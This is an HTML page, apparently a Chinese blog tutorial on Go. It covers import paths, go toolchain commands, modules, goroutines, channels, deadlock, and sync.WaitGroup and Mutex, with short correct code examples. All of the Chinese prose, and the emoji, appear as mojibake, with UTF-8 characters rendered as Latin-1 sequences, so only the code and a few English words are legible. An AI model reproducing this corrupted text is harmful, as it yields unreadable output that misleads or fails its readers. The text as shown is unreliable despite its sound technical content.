ä¸­å¯¼å…¥å®ƒæ—¶çš„è·¯å¾„æ˜¯ <code>github.com/myuser/myproject/helper</code>ã€‚</li><li>å¯è§æ€§ï¼šå¦‚æœ <code>helper.go</code> ä¸­å®šä¹‰äº†ä¸€ä¸ªå…¬å¼€å‡½æ•° <code>Func()</code>ï¼Œåˆ™åœ¨ <code>main.go</code> ä¸­å¯ä»¥è®¿é—®å®ƒã€‚å¦‚æœæ˜¯ç§æœ‰å‡½æ•° <code>func()</code>ï¼Œåˆ™ä¸èƒ½ã€‚</li></ul><p>é€šè¿‡è¿™æ ·çš„æœºåˆ¶ï¼ŒGo è¯­è¨€å®ç°äº†è‰¯å¥½çš„ä»£ç ç»„ç»‡ã€æ¨¡å—åŒ–å’Œå°è£…ã€‚ç†è§£è¿™äº›æ¦‚å¿µå¯¹äºç¼–å†™æ¸…æ™°ã€æ˜“äºç»´æŠ¤çš„ Go ä»£ç è‡³å…³é‡è¦ã€‚ğŸ’»ğŸ“˜</p><p>åœ¨ Go è¯­è¨€ä¸­ï¼Œå½“ä½ ä½¿ç”¨åƒ <code>github.com/myuser/myproject/helper</code> è¿™æ ·çš„å¯¼å…¥è·¯å¾„æ—¶ï¼Œä½ å®é™…ä¸Šæ˜¯æŒ‰ç…§ Go çš„åŒ…ï¼ˆpackageï¼‰å¯¼å…¥æœºåˆ¶æ¥å¼•å…¥ä»£ç ã€‚è¿™é‡Œï¼Œ<code>github.com/myuser/myproject/helper</code> å¹¶ä¸æ˜¯ç›´æ¥å¯¼å…¥ GitHub ä»“åº“ä¸­çš„ä»£ç ï¼Œè€Œæ˜¯æŒ‡å®šäº†ä¸€ä¸ªæœ¬åœ°ç¯å¢ƒä¸­çš„åŒ…è·¯å¾„ï¼Œè¿™ä¸ªè·¯å¾„é€šå¸¸ä¸è¿œç¨‹ä»“åº“çš„ URL ç›¸å¯¹åº”ã€‚è®©æˆ‘æ¥è¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼š</p><h3 id="æœ¬åœ°åŒ…å¯¼å…¥"><a href="#æœ¬åœ°åŒ…å¯¼å…¥" class="headerlink" title="æœ¬åœ°åŒ…å¯¼å…¥"></a>æœ¬åœ°åŒ…å¯¼å…¥</h3><ol><li><p><strong>æ¨¡å—ä¸åŒ…çš„å…³ç³»</strong></p><ul><li>åœ¨ Go ä¸­ï¼Œä¸€ä¸ªæ¨¡å—æ˜¯åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªåŒ…çš„é›†åˆã€‚</li><li><code>go.mod</code> æ–‡ä»¶å®šä¹‰äº†æ¨¡å—çš„æ ¹è·¯å¾„ï¼ˆä¾‹å¦‚ <code>github.com/myuser/myproject</code>ï¼‰ã€‚</li><li>åœ¨æ­¤æ¨¡å—å†…ï¼Œä½ å¯ä»¥æœ‰å¤šä¸ªåŒ…ï¼Œä¾‹å¦‚ <code>helper</code>ã€‚</li></ul></li><li><p><strong>å¯¼å…¥æœºåˆ¶</strong></p><ul><li>å½“ä½ åœ¨ä»£ç ä¸­å†™ <code>import &quot;github.com/myuser/myproject/helper&quot;</code> æ—¶ï¼ŒGo ä¼šåœ¨æœ¬åœ°ç¯å¢ƒä¸­æŸ¥æ‰¾è¿™ä¸ªè·¯å¾„ã€‚</li><li>è¿™é€šå¸¸æ„å‘³ç€åœ¨ä½ çš„é¡¹ç›®ç›®å½•ï¼ˆåŒ…å« <code>go.mod</code> æ–‡ä»¶çš„åœ°æ–¹ï¼‰ä¸‹åº”è¯¥æœ‰ä¸€ä¸ª <code>helper</code> å­ç›®å½•ã€‚</li><li>è¿™ä¸ª <code>helper</code> å­ç›®å½•åº”è¯¥åŒ…å« Go ä»£ç æ–‡ä»¶ï¼ˆå¦‚ <code>helper.go</code>ï¼‰ï¼Œå¹¶ä¸”è¿™äº›æ–‡ä»¶çš„åŒ…å£°æ˜åº”è¯¥æ˜¯ <code>package helper</code>ã€‚</li></ul></li></ol><h3 id="è¿œç¨‹ä»“åº“ä¸ä¾èµ–ç®¡ç†"><a href="#è¿œç¨‹ä»“åº“ä¸ä¾èµ–ç®¡ç†" class="headerlink" title="è¿œç¨‹ä»“åº“ä¸ä¾èµ–ç®¡ç†"></a>è¿œç¨‹ä»“åº“ä¸ä¾èµ–ç®¡ç†</h3><ol><li><p><strong>ä¾èµ–è·å–</strong></p><ul><li>å½“ä½ çš„é¡¹ç›®ä¾èµ–äº GitHub ä¸Šçš„å…¶ä»–é¡¹ç›®æ—¶ï¼Œä¾‹å¦‚ <code>import &quot;github.com/someuser/somelibrary&quot;</code>ï¼ŒGo ä¼šä½¿ç”¨ Go Modulesï¼ˆå¦‚æœä½ çš„é¡¹ç›®å¯ç”¨äº†å®ƒï¼‰æ¥ç®¡ç†è¿™äº›ä¾èµ–ã€‚</li><li>è¿™æ—¶ï¼ŒGo ä¼šä»è¿œç¨‹ä»“åº“ä¸‹è½½ä¾èµ–åˆ°æœ¬åœ°çš„æ¨¡å—ç¼“å­˜ä¸­ï¼Œå¹¶åœ¨æ„å»ºæ—¶ä½¿ç”¨è¿™äº›ä¾èµ–ã€‚</li></ul></li><li><p><strong>ç‰ˆæœ¬ç®¡ç†</strong></p><ul><li>Go Modules å…è®¸ä½ æŒ‡å®šä¾èµ–çš„ç¡®åˆ‡ç‰ˆæœ¬ï¼Œä¾‹å¦‚åœ¨ <code>go.mod</code> æ–‡ä»¶ä¸­ã€‚</li><li>è¿™ç¡®ä¿äº†é¡¹ç›®æ„å»ºçš„ä¸€è‡´æ€§ï¼Œå› ä¸ºå®ƒä¼šä½¿ç”¨ç¡®å®šçš„ä¾èµ–ç‰ˆæœ¬ã€‚</li></ul></li></ol><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><ul><li>æ‰€ä»¥ï¼Œå½“ä½ å†™ <code>import &quot;github.com/myuser/myproject/helper&quot;</code> æ—¶ï¼Œä½ å®é™…ä¸Šæ˜¯å¼•å…¥äº†ä½ æœ¬åœ°é¡¹ç›®å†…éƒ¨çš„ä¸€ä¸ªåŒ…ï¼Œè€Œä¸æ˜¯ç›´æ¥ä» GitHub å¯¼å…¥ã€‚</li><li>å¦‚æœä½ çš„é¡¹ç›®ä¾èµ–äº GitHub æˆ–å…¶ä»–ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸Šçš„å¤–éƒ¨é¡¹ç›®ï¼ŒGo Modules ä¼šè´Ÿè´£ä¸‹è½½å’Œç®¡ç†è¿™äº›ä¾èµ–ã€‚</li></ul><p>è¿™ç§æœºåˆ¶éå¸¸é€‚åˆç‰ˆæœ¬æ§åˆ¶å’Œåä½œå¼€å‘ï¼Œç¡®ä¿äº†ä»£ç çš„æ¨¡å—åŒ–å’Œä¾èµ–ç®¡ç†çš„æ¸…æ™°ã€‚ğŸ’»ğŸ”ğŸŒ</p><h1 id="goå·¥å…·é“¾å’Œgoæ¨¡å—"><a href="#goå·¥å…·é“¾å’Œgoæ¨¡å—" class="headerlink" title="goå·¥å…·é“¾å’Œgoæ¨¡å—"></a>goå·¥å…·é“¾å’Œgoæ¨¡å—</h1><p>åœ¨ Go è¯­è¨€ä¸­ï¼Œâ€Go å·¥å…·é“¾â€å’Œâ€æ¨¡å—â€æ˜¯ä¸¤ä¸ªéå¸¸æ ¸å¿ƒçš„æ¦‚å¿µï¼Œç‰¹åˆ«æ˜¯å¯¹äºé¡¹ç›®çš„æ„å»ºã€ä¾èµ–ç®¡ç†å’ŒåŒ…çš„ç»„ç»‡æ¥è¯´è‡³å…³é‡è¦ã€‚ä¸‹é¢æˆ‘ä»¬æ¥è¯¦ç»†æ¢è®¨ä¸€ä¸‹è¿™ä¸¤ä¸ªæ¦‚å¿µï¼š</p><h3 id="Go-å·¥å…·é“¾ï¼ˆGo-Toolchainï¼‰"><a href="#Go-å·¥å…·é“¾ï¼ˆGo-Toolchainï¼‰" class="headerlink" title="Go å·¥å…·é“¾ï¼ˆGo Toolchainï¼‰"></a>Go å·¥å…·é“¾ï¼ˆGo Toolchainï¼‰</h3><p>Go å·¥å…·é“¾æ˜¯ä¸€ç³»åˆ—å·¥å…·çš„é›†åˆï¼Œè¿™äº›å·¥å…·ç”¨äºå¤„ç† Go ä»£ç çš„ç¼–è¯‘ã€å®‰è£…ã€æ ¼å¼åŒ–ã€æµ‹è¯•ç­‰ä»»åŠ¡ã€‚ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ol><li><p><strong>go build</strong></p><ul><li>ç”¨äºç¼–è¯‘ Go ç¨‹åºå’ŒåŒ…ã€‚</li><li>å®ƒä¼šç¼–è¯‘æŒ‡å®šçš„æºæ–‡ä»¶ã€ä¾èµ–ï¼Œå¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–åº“ã€‚</li></ul></li><li><p><strong>go run</strong></p><ul><li>ç›´æ¥è¿è¡Œ Go ç¨‹åºï¼Œé€šå¸¸ç”¨äºå¿«é€Ÿæµ‹è¯•ã€‚</li><li>å®ƒå®é™…ä¸Šæ˜¯ <code>go build</code> å’Œæ‰§è¡Œç¼–è¯‘åçš„ç¨‹åºçš„ç»„åˆã€‚</li></ul></li><li><p><strong>go test</strong></p><ul><li>è¿è¡Œæµ‹è¯•ç”¨ä¾‹ï¼ŒåŒ…æ‹¬å•å…ƒæµ‹è¯•ã€åŸºå‡†æµ‹è¯•ç­‰ã€‚</li><li>å®ƒå¯ä»¥è‡ªåŠ¨æ‰¾åˆ°æºä»£ç ä¸­çš„æµ‹è¯•ä»£ç å¹¶æ‰§è¡Œã€‚</li></ul></li><li><p><strong>go get</strong></p><ul><li>åœ¨ Go Modules å‡ºç°ä¹‹å‰ï¼Œå®ƒç”¨äºä¸‹è½½å’Œå®‰è£…åŒ…åŠå…¶ä¾èµ–ã€‚</li><li>åœ¨ Go Modules ç¯å¢ƒä¸‹ï¼Œå®ƒè¿˜èƒ½ç”¨äºæ·»åŠ ä¾èµ–åˆ°ä½ çš„é¡¹ç›®ä¸­ã€‚</li></ul></li><li><p><strong>go mod</strong></p><ul><li>Go Modules çš„å‘½ä»¤è¡Œæ¥å£ï¼Œç”¨äºå¤„ç†æ¨¡å—çš„ä¾èµ–ç®¡ç†ã€‚</li><li>åŒ…æ‹¬åˆå§‹åŒ–æ–°æ¨¡å—ã€æ·»åŠ ã€æ›´æ–°ã€ç§»é™¤ä¾èµ–ç­‰ã€‚</li></ul></li><li><p><strong>go fmt</strong></p><ul><li>æ ¼å¼åŒ– Go æºä»£ç ï¼Œç¡®ä¿ä»£ç é£æ ¼ä¸€è‡´ã€‚</li></ul></li><li><p><strong>go env</strong></p><ul><li>æŸ¥çœ‹å’Œè®¾ç½® Go ç¯å¢ƒå˜é‡ã€‚</li></ul></li></ol><p>è¿™äº›å·¥å…·éƒ½æ˜¯ Go è¯­è¨€æ ‡å‡†å‘è¡Œç‰ˆçš„ä¸€éƒ¨åˆ†ï¼Œå¯¹äºæ—¥å¸¸çš„ Go å¼€å‘æ¥è¯´éå¸¸é‡è¦ã€‚</p><h3 id="Go-æ¨¡å—ï¼ˆGo-Modulesï¼‰"><a href="#Go-æ¨¡å—ï¼ˆGo-Modulesï¼‰" class="headerlink" title="Go æ¨¡å—ï¼ˆGo Modulesï¼‰"></a>Go æ¨¡å—ï¼ˆGo Modulesï¼‰</h3><p>Go æ¨¡å—æ˜¯ Go è¯­è¨€çš„ä¾èµ–ç®¡ç†ç³»ç»Ÿï¼Œäº Go 1.11 ç‰ˆæœ¬ä¸­å¼•å…¥ï¼Œç°åœ¨å·²ç»æ˜¯ç®¡ç†ä¾èµ–çš„é¦–é€‰æ–¹å¼ã€‚</p><ol><li><p><strong>æ¨¡å—çš„æ¦‚å¿µ</strong></p><ul><li>æ¨¡å—æ˜¯ä¸€ç³»åˆ— Go åŒ…çš„é›†åˆï¼Œå®ƒä»¬è¢«æ”¾ç½®åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•ä¸‹ï¼Œç”±ä¸€ä¸ª <code>go.mod</code> æ–‡ä»¶æ‰€æè¿°ã€‚</li><li><code>go.mod</code> æ–‡ä»¶åŒ…å«äº†æ¨¡å—çš„åç§°ã€ä¾èµ–é¡¹åŠå®ƒä»¬çš„ç‰ˆæœ¬ã€‚</li></ul></li><li><p><strong>åŠŸèƒ½</strong></p><ul><li>æä¾›äº†å¯¹ä¾èµ–ç‰ˆæœ¬çš„ç²¾ç¡®æ§åˆ¶ï¼Œç¡®ä¿é¡¹ç›®çš„å¯é‡å¤æ„å»ºã€‚</li><li>å…è®¸å¼€å‘è€…åœ¨é¡¹ç›®å¤–çš„ä»»ä½•åœ°æ–¹å·¥ä½œï¼Œä¸å†å—é™äº <code>GOPATH</code>ã€‚</li></ul></li><li><p><strong>ä¸»è¦å‘½ä»¤</strong></p><ul><li><code>go mod init</code>ï¼šåˆå§‹åŒ–æ–°æ¨¡å—ï¼Œåˆ›å»º <code>go.mod</code> æ–‡ä»¶ã€‚</li><li><code>go mod tidy</code>ï¼šæ•´ç†ç°æœ‰çš„ä¾èµ–ï¼Œç§»é™¤ä¸å†éœ€è¦çš„ä¾èµ–ã€‚</li><li><code>go mod download</code>ï¼šä¸‹è½½ <code>go.mod</code> æ–‡ä»¶ä¸­æŒ‡å®šçš„æ‰€æœ‰ä¾èµ–ã€‚</li></ul></li></ol><h3 id="ç»“è®º-1"><a href="#ç»“è®º-1" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>Go å·¥å…·é“¾å’Œ Go æ¨¡å—å…±åŒæ„æˆäº† Go è¯­è¨€çš„ç”Ÿæ€ç³»ç»Ÿçš„åŸºç¡€ï¼Œå®ƒä»¬ä½¿å¾— Go ä»£ç çš„å¼€å‘ã€æ„å»ºã€æ ¼å¼åŒ–ã€æµ‹è¯•ä»¥åŠä¾èµ–ç®¡ç†å˜å¾—ç®€å•å’Œé«˜æ•ˆã€‚ç†è§£å’Œç†Ÿç»ƒä½¿ç”¨è¿™äº›å·¥å…·å’Œæ¦‚å¿µï¼Œå¯¹äºä»»ä½• Go å¼€å‘è€…æ¥è¯´éƒ½æ˜¯éå¸¸é‡è¦çš„ã€‚ğŸ’¡ğŸ”§ğŸ“¦ğŸš€</p><h1 id="å¹¶å‘ï¼ˆConcurrencyï¼‰ä¸å¹¶è¡Œï¼ˆParallelismï¼‰"><a href="#å¹¶å‘ï¼ˆConcurrencyï¼‰ä¸å¹¶è¡Œï¼ˆParallelismï¼‰" class="headerlink" title="å¹¶å‘ï¼ˆConcurrencyï¼‰ä¸å¹¶è¡Œï¼ˆParallelismï¼‰"></a>å¹¶å‘ï¼ˆConcurrencyï¼‰ä¸å¹¶è¡Œï¼ˆParallelismï¼‰</h1><ul><li><strong>å¹¶å‘</strong>ï¼šå¤šä¸ªä»»åŠ¡å¯ä»¥åœ¨é‡å çš„æ—¶é—´æ®µå†…è¿›è¡Œï¼Œä½†ä¸ä¸€å®šåŒæ—¶ã€‚</li><li><strong>å¹¶è¡Œ</strong>ï¼šå¤šä¸ªä»»åŠ¡çœŸæ­£åŒæ—¶è¿›è¡Œï¼Œé€šå¸¸éœ€è¦å¤šæ ¸å¤„ç†å™¨ã€‚</li></ul><p>Go è¯­è¨€çš„å¹¶å‘æ¨¡å‹ä½¿å¾—å¹¶å‘ç¼–ç¨‹æ›´åŠ ç®€å•å’Œé«˜æ•ˆã€‚</p><h3 id="Goroutines"><a href="#Goroutines" class="headerlink" title="Goroutines"></a>Goroutines</h3><ol><li><p><strong>å®šä¹‰</strong></p><ul><li>Goroutine æ˜¯ Go è¯­è¨€çš„è½»é‡çº§çº¿ç¨‹ï¼Œç”± Go è¿è¡Œæ—¶ç¯å¢ƒç®¡ç†ã€‚</li><li>Goroutines åœ¨ç›¸åŒçš„åœ°å€ç©ºé—´ä¸­è¿è¡Œï¼Œå› æ­¤è®¿é—®å…±äº«å†…å­˜å¿…é¡»æ˜¯å®‰å…¨çš„ã€‚</li></ul></li><li><p><strong>åˆ›å»º Goroutine</strong></p><ul><li>ä½¿ç”¨ <code>go</code> å…³é”®å­— followed by a function call.<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> functionName()</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ç¤ºä¾‹</strong></p><ul><li>å‡è®¾æœ‰ä¸€ä¸ªå‡½æ•° <code>printNumbers</code>ï¼Œæ‰“å°æ•°å­—1åˆ°5ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printNumbers</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        fmt.Println(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>åœ¨ä¸»å‡½æ•°ä¸­å¹¶å‘æ‰§è¡Œï¼š<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> printNumbers()</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="Channels"><a href="#Channels" class="headerlink" title="Channels"></a>Channels</h3><ol><li><p><strong>å®šä¹‰</strong></p><ul><li>Channels æ˜¯ç”¨æ¥åœ¨ Goroutines ä¹‹é—´ä¼ é€’æ•°æ®çš„ç®¡é“ã€‚</li><li>å¯ä»¥æ˜¯å¸¦ç¼“å†²çš„æˆ–æ— ç¼“å†²çš„ã€‚</li></ul></li><li><p><strong>åˆ›å»º Channel</strong></p><ul><li>æ— ç¼“å†²ï¼š<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure></li><li>å¸¦ç¼“å†²ï¼š<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">5</span>) <span class="comment">// ç¼“å†²å¤§å°ä¸º5</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ä½¿ç”¨ Channel</strong></p><ul><li>å‘é€æ•°æ®åˆ° Channelï¼š<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch &lt;- value</span><br></pre></td></tr></table></figure></li><li>ä» Channel æ¥æ”¶æ•°æ®ï¼š<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">value := &lt;-ch</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å…³é—­ Channel</strong></p><ul><li>ä½¿ç”¨ <code>close()</code> å‡½æ•°ã€‚</li><li>å…³é—­åä¸èƒ½å†å‘ Channel å‘é€æ•°æ®ï¼Œä½†å¯ä»¥ç»§ç»­æ¥æ”¶æ•°æ®ã€‚</li></ul></li><li><p><strong>ç¤ºä¾‹</strong></p><ul><li>åˆ›å»ºä¸€ä¸ª Channel ä¼ é€’æ•´æ•°ã€‚</li><li>åœ¨ä¸€ä¸ª Goroutine ä¸­å‘é€æ•°å­—åˆ° Channelï¼Œåœ¨ä¸» Goroutine ä¸­æ¥æ”¶å®ƒä»¬ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">            ch &lt;- i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>(ch)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        fmt.Println(num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="æ³¨æ„äº‹é¡¹-1"><a href="#æ³¨æ„äº‹é¡¹-1" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li><strong>é¿å…æ­»é”</strong>ï¼šç¡®ä¿ Goroutines ä¹‹é—´çš„é€šä¿¡æ˜¯æ­£ç¡®çš„ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æ­»é”ã€‚</li><li><strong>åŒæ­¥</strong>ï¼šä½¿ç”¨ <code>sync</code> åŒ…ä¸­çš„å·¥å…·ï¼ˆå¦‚ WaitGroupï¼‰æ¥åŒæ­¥ Goroutinesã€‚</li><li><strong>æ•°æ®ç«äº‰</strong>ï¼šå½“å¤šä¸ª Goroutines è®¿é—®å…±äº«èµ„æºæ—¶ï¼Œéœ€è¦ä½¿ç”¨é”ï¼ˆå¦‚ <code>sync.Mutex</code>ï¼‰æ¥é¿å…æ•°æ®ç«äº‰ã€‚</li></ul><h3 id="ç»“è®º-2"><a href="#ç»“è®º-2" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>Go è¯­è¨€ä¸­çš„å¹¶å‘ç¼–ç¨‹å¼ºå¤§ä¸”æ˜“äºç†è§£ã€‚é€šè¿‡ Goroutines å’Œ Channelsï¼Œä½ å¯ä»¥é«˜æ•ˆåœ°æ„å»ºå¹¶å‘ç¨‹åºã€‚ä½œä¸ºæ–°æ‰‹ï¼Œä½ å¯èƒ½éœ€è¦ä¸€äº›æ—¶é—´æ¥ç†Ÿæ‚‰è¿™äº›æ¦‚å¿µï¼Œä½†ä¸€æ—¦æŒæ¡ï¼Œå®ƒä»¬ä¼šå¤§å¤§å¢å¼ºä½ çš„ç¼–ç¨‹èƒ½åŠ›ã€‚å®è·µæ˜¯æœ€å¥½çš„å­¦ä¹ æ–¹å¼ï¼Œå°½é‡å¤šç¼–å†™å¹¶å‘ç¨‹åºæ¥æé«˜ä½ çš„æŠ€èƒ½ï¼ğŸ’»ğŸš€ğŸ”§</p><p>å¥½çš„ï¼Œæˆ‘æ¥ä¸€ä¸€è§£ç­”ä½ çš„é—®é¢˜ï¼š</p><h3 id="1-åŒ¿åå‡½æ•°å’Œç«‹å³æ‰§è¡Œ"><a href="#1-åŒ¿åå‡½æ•°å’Œç«‹å³æ‰§è¡Œ" class="headerlink" title="1. åŒ¿åå‡½æ•°å’Œç«‹å³æ‰§è¡Œ"></a>1. åŒ¿åå‡½æ•°å’Œç«‹å³æ‰§è¡Œ</h3><p>åœ¨ä½ æåˆ°çš„ä»£ç ç‰‡æ®µä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ª<strong>åŒ¿åå‡½æ•°</strong>ï¼Œå¹¶ä¸”è¿™ä¸ªåŒ¿åå‡½æ•°æ˜¯<strong>ç«‹å³æ‰§è¡Œ</strong>çš„ã€‚</p><ul><li><strong>åŒ¿åå‡½æ•°</strong>ï¼šå°±æ˜¯æ²¡æœ‰åå­—çš„å‡½æ•°ã€‚åœ¨ Go ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ <code>func</code> å…³é”®å­—æ¥ç›´æ¥å®šä¹‰ä¸€ä¸ªåŒ¿åå‡½æ•°ã€‚</li><li><strong>ç«‹å³æ‰§è¡Œ</strong>ï¼šåœ¨å®šä¹‰åŒ¿åå‡½æ•°åï¼Œç´§æ¥ç€çš„ <code>()</code> ä½¿è¿™ä¸ªå‡½æ•°ç«‹å³æ‰§è¡Œã€‚è¿™ç§æ¨¡å¼åœ¨ Go ä¸­å¾ˆå¸¸è§ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦å¹¶å‘æ‰§è¡Œå‡½æ•°æ—¶ã€‚</li></ul><h3 id="2-æ­»é”ï¼ˆDeadlockï¼‰"><a href="#2-æ­»é”ï¼ˆDeadlockï¼‰" class="headerlink" title="2. æ­»é”ï¼ˆDeadlockï¼‰"></a>2. æ­»é”ï¼ˆDeadlockï¼‰</h3><p>æ­»é”æ˜¯å¹¶å‘ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªå¸¸è§é—®é¢˜ï¼Œå®ƒå‘ç”Ÿåœ¨ä»¥ä¸‹æƒ…å†µï¼š</p><ul><li>å½“ä¸¤ä¸ªæˆ–å¤šä¸ª goroutines åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå½¼æ­¤ç­‰å¾…å¯¹æ–¹é‡Šæ”¾èµ„æºï¼Œä»è€Œé€ æˆäº†æ— é™ç­‰å¾…çš„æƒ…å†µã€‚</li><li>å¸¸è§çš„æƒ…å†µåŒ…æ‹¬ï¼š<ul><li>ä¸¤ä¸ª goroutines äº’ç›¸ç­‰å¾…å¯¹æ–¹å®Œæˆï¼Œéƒ½ä¸é‡Šæ”¾è‡ªå·±æŒæœ‰çš„èµ„æºã€‚</li><li>è¯•å›¾ä»ä¸€ä¸ªç©ºçš„ channel ä¸­æ¥æ”¶æ•°æ®ï¼Œè€Œæ²¡æœ‰å…¶ä»– goroutine å‘é€æ•°æ®åˆ°è¿™ä¸ª channelã€‚</li><li>è¯•å›¾å‘ä¸€ä¸ªå·²æ»¡çš„ channel å‘é€æ•°æ®ï¼Œè€Œæ²¡æœ‰å…¶ä»– goroutine æ¥æ”¶æ•°æ®ã€‚</li></ul></li></ul><p>æ­»é”çš„è§£å†³é€šå¸¸éœ€è¦å¯¹ç¨‹åºçš„é€»è¾‘è¿›è¡Œä»”ç»†çš„åˆ†æå’Œè®¾è®¡ï¼Œç¡®ä¿èµ„æºçš„æ­£ç¡®é‡Šæ”¾å’Œåˆç†çš„åŒæ­¥ã€‚</p><h3 id="3-ä½¿ç”¨-sync-åŒ…"><a href="#3-ä½¿ç”¨-sync-åŒ…" class="headerlink" title="3. ä½¿ç”¨ sync åŒ…"></a>3. ä½¿ç”¨ <code>sync</code> åŒ…</h3><p><code>sync</code> åŒ…æä¾›äº†å¤šç§åŒæ­¥åŸè¯­ï¼ˆå¦‚äº’æ–¥é”ã€ç­‰å¾…ç»„ç­‰ï¼‰ï¼Œç”¨äºåœ¨ goroutines ä¹‹é—´è¿›è¡ŒåŒæ­¥ã€‚</p><h4 id="WaitGroup"><a href="#WaitGroup" class="headerlink" title="WaitGroup"></a>WaitGroup</h4><ul><li>ç”¨äºç­‰å¾…ä¸€ç»„ goroutines å®Œæˆã€‚</li><li>ä¸»è¦æ–¹æ³•åŒ…æ‹¬ <code>Add</code>, <code>Done</code>, å’Œ <code>Wait</code>ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>) <span class="comment">// å¢åŠ ç­‰å¾…è®¡æ•°</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wg.Done() <span class="comment">// å®Œæˆæ—¶å‡å°‘ç­‰å¾…è®¡æ•°</span></span><br><span class="line">            fmt.Println(i)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait() <span class="comment">// ç­‰å¾…æ‰€æœ‰ goroutine å®Œæˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Mutexï¼ˆäº’æ–¥é”ï¼‰"><a href="#Mutexï¼ˆäº’æ–¥é”ï¼‰" class="headerlink" title="Mutexï¼ˆäº’æ–¥é”ï¼‰"></a>Mutexï¼ˆäº’æ–¥é”ï¼‰</h4><ul><li>ç”¨äºåœ¨å¤šä¸ª goroutine è®¿é—®å…±äº«èµ„æºæ—¶æä¾›äº’æ–¥è®¿é—®ã€‚</li><li>ä¸»è¦æ–¹æ³•æ˜¯ <code>Lock</code> å’Œ <code>Unlock</code>ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mu sync.Mutex</span><br><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">increment</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mu.Lock()   <span class="comment">// åŠ é”</span></span><br><span class="line">    count++     <span class="comment">// ä¿®æ”¹å…±äº«èµ„æº</span></span><br><span class="line">    mu.Unlock() <span class="comment">// è§£é”</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™äº›æ˜¯ <code>sync</code> 